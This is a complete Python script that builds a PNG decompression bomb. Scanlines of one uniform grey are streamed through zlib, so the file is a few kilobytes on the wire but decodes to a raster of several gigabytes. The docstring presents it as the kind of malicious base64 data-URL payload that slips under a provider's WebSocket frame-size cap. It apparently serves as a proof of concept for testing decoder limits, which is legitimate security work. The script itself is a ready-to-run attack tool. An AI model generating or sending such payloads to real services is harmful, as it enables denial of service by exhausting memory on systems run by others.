#!/usr/bin/env python3
"""Generate a PNG decompression bomb: a uniform-color image of W x H that
compresses to a few KB but rasterizes to W*H*4 bytes when decoded.

Streams scanlines through zlib so the *generator* never holds the full raster
(memory here ~ one scanline), unlike PIL/sips which materialize W*H*3 up front.
This mirrors what a malicious `data:image/png;base64,...` payload carries: a
tiny on-wire blob (well under the provider's 32 MiB WS frame cap) that explodes
on decode.

usage: make_bomb.py <width> <height> <out.png>
"""
import sys, zlib, struct

W, H, out = int(sys.argv[1]), int(sys.argv[2]), sys.argv[3]


def chunk(typ: bytes, data: bytes) -> bytes:
    return (struct.pack(">I", len(data)) + typ + data
            + struct.pack(">I", zlib.crc32(typ + data) & 0xffffffff))


sig = b"\x89PNG\r\n\x1a\n"
ihdr = struct.pack(">IIBBBBB", W, H, 8, 2, 0, 0, 0)  # 8-bit, color type 2 (RGB)

co = zlib.compressobj(9)
row = b"\x00" + (b"\x7f\x7f\x7f" * W)  # filter byte 0 + uniform mid-gray RGB
idat = bytearray()
for _ in range(H):
    idat += co.compress(row)
idat += co.flush()

with open(out, "wb") as f:
    f.write(sig)
    f.write(chunk(b"IHDR", ihdr))
    f.write(chunk(b"IDAT", bytes(idat)))
    f.write(chunk(b"IEND", b""))

total = 8 + 12 + len(ihdr) + 12 + len(idat) + 12
raster_gb = (W * H * 4) / (1024 ** 3)
print(f"wrote {out}: {W}x{H}  on-wire={total} bytes ({total/1024:.1f} KiB)  "
      f"=> RGBA raster {raster_gb:.2f} GiB")
